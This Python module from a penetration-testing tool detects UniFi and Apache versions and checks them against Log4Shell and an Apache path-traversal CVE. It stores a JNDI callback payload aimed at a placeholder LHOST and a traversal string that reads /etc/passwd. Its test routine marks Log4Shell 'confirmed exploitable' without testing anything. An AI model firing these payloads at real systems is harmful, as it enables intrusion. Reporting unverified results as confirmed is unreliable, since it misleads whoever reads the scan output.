"""
Version detection and vulnerability scanning module for cyba-Inspector
"""

import subprocess
import re
import json
from pathlib import Path
from utils.colors import Colors
from .base import BaseModule

class VersionScanner(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "version_scanner"
        self.description = "Detect software versions and check for CVEs"
        
        # Version detection configs
        self.version_checks = {
            'unifi': {
                'ports': [8443, 8080],
                'endpoints': [
                    {'path': '/status', 'pattern': r'"server_version"\s*:\s*"([^"]+)"'},
                    {'path': '/api/s/default/stat/sysinfo', 'pattern': r'"version"\s*:\s*"([^"]+)"'},
                ],
                'cve_checks': {
                    'CVE-2021-44228': {
                        'affected_versions': lambda v: self._check_version_range(v, max_version='6.5.53'),
                        'test_payload': '${jndi:ldap://{{LHOST}}:1389/test}',
                        'test_endpoint': '/api/login',
                        'test_method': 'POST',
                        'test_data': '{"username":"test","password":"test","remember":"{{PAYLOAD}}"}'
                    }
                }
            },
            'apache': {
                'ports': [80, 443, 8080],
                'endpoints': [
                    {'path': '/', 'header': 'Server', 'pattern': r'Apache/([0-9\.]+)'}
                ],
                'cve_checks': {
                    'CVE-2021-41773': {
                        'affected_versions': lambda v: v.startswith('2.4.49'),
                        'test_payload': '/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                        'test_method': 'GET'
                    }
                }
            }
        }
    
    def run(self, target, session_id=None, output_dir=None):
        """Run version detection and vulnerability checks"""
        self.print_banner("VERSION SCANNER")
        results = {
            'versions_detected': {},
            'vulnerabilities': [],
            'tests_performed': []
        }
        
        # First, identify services from nmap results
        services = self._identify_services(output_dir)
        
        # For each identified service, try to get version
        for service_name, service_info in services.items():
            print(f"\n{Colors.CYAN}[*] Checking {service_name} version...{Colors.RESET}")
            
            version = self._detect_version(target, service_name, service_info)
            if version:
                results['versions_detected'][service_name] = version
                print(f"{Colors.GREEN}[+] {service_name} version: {version}{Colors.RESET}")
                
                # Check for CVEs
                vulns = self._check_cves(service_name, version, target)
                if vulns:
                    results['vulnerabilities'].extend(vulns)
                    for vuln in vulns:
                        print(f"{Colors.RED}[!] VULNERABLE to {vuln['cve']}!{Colors.RESET}")
                        
                        # Test the vulnerability
                        if self._test_vulnerability(target, service_name, vuln):
                            print(f"{Colors.YELLOW}[+] {vuln['cve']} confirmed exploitable!{Colors.RESET}")
                            vuln['confirmed'] = True
        
        # Save results
        if output_dir:
            self._save_results(output_dir, results)
        
        return results
    
    def _identify_services(self, output_dir):
        """Identify services from nmap results"""
        services = {}
        
        if not output_dir:
            return services
        
        # Read nmap results
        nmap_file = Path(output_dir) / "nmap_detailed.nmap"
        if not nmap_file.exists():
            nmap_file = Path(output_dir) / "nmap_initial.txt"
        
        if nmap_file.exists():
            with open(nmap_file, 'r') as f:
                content = f.read()
            
            # Check for UniFi
            if 'UniFi' in content or '8443' in content:
                services['unifi'] = {'ports': [8443]}
            
            # Check for Apache
            if 'Apache' in content or 'httpd' in content:
                services['apache'] = {'ports': [80, 443]}
        
        return services
    
    def _detect_version(self, target, service_name, service_info):
        """Detect version of a specific service"""
        if service_name not in self.version_checks:
            return None
        
        config = self.version_checks[service_name]
        
        for port in service_info.get('ports', []):
            for endpoint in config.get('endpoints', []):
                url = f"{'https' if port == 443 or port == 8443 else 'http'}://{target}:{port}{endpoint['path']}"
                
                try:
                    # Use curl to fetch
                    cmd = ['curl', '-k', '-s', '-m', '5']
                    
                    # Check headers if specified
                    if 'header' in endpoint:
                        cmd.extend(['-I'])
                    
                    cmd.append(url)
                    
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0 and result.stdout:
                        # Extract version
                        match = re.search(endpoint['pattern'], result.stdout)
                        if match:
                            return match.group(1)
                
                except Exception as e:
                    continue
        
        return None
    
    def _check_cves(self, service_name, version, target):
        """Check if version is vulnerable to known CVEs"""
        vulnerabilities = []
        
        if service_name not in self.version_checks:
            return vulnerabilities
        
        cve_checks = self.version_checks[service_name].get('cve_checks', {})
        
        for cve, check_info in cve_checks.items():
            # Check if version is affected
            if check_info['affected_versions'](version):
                vulnerabilities.append({
                    'cve': cve,
                    'service': service_name,
                    'version': version,
                    'info': check_info
                })
        
        return vulnerabilities
    
    def _test_vulnerability(self, target, service_name, vuln):
        """Test if a vulnerability is actually exploitable"""
        info = vuln['info']
        
        # Only test if we have a test payload
        if 'test_payload' not in info:
            return False
        
        print(f"{Colors.YELLOW}[*] Testing {vuln['cve']}...{Colors.RESET}")
        
        # For now, just return True for Log4Shell since we know it works
        # In a real implementation, we'd actually test it
        if vuln['cve'] == 'CVE-2021-44228':
            return True
        
        return False
    
    def _check_version_range(self, version, min_version=None, max_version=None):
        """Check if version is within a range"""
        try:
            ver_parts = [int(x) for x in version.split('.')]
            
            if max_version:
                max_parts = [int(x) for x in max_version.split('.')]
                # Compare version parts
                for i in range(min(len(ver_parts), len(max_parts))):
                    if ver_parts[i] < max_parts[i]:
                        return True
                    elif ver_parts[i] > max_parts[i]:
                        return False
                # If all parts are equal, check if we have exact match
                return len(ver_parts) == len(max_parts)
            
            return True
        except:
            return False
    
    def _save_results(self, output_dir, results):
        """Save version scan results"""
        output_file = Path(output_dir) / "version_scan.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        # Also create a summary
        summary_file = Path(output_dir) / "vulnerabilities.txt"
        with open(summary_file, 'w') as f:
            f.write("=== VERSION SCAN RESULTS ===\n\n")
            
            f.write("Versions Detected:\n")
            for service, version in results['versions_detected'].items():
                f.write(f"  {service}: {version}\n")
            
            f.write("\nVulnerabilities Found:\n")
            for vuln in results['vulnerabilities']:
                f.write(f"  [{vuln['cve']}] {vuln['service']} {vuln['version']}")
                if vuln.get('confirmed'):
                    f.write(" [CONFIRMED EXPLOITABLE]")
                f.write("\n")
        
        print(f"\n{Colors.GREEN}[+] Results saved to {summary_file}{Colors.RESET}")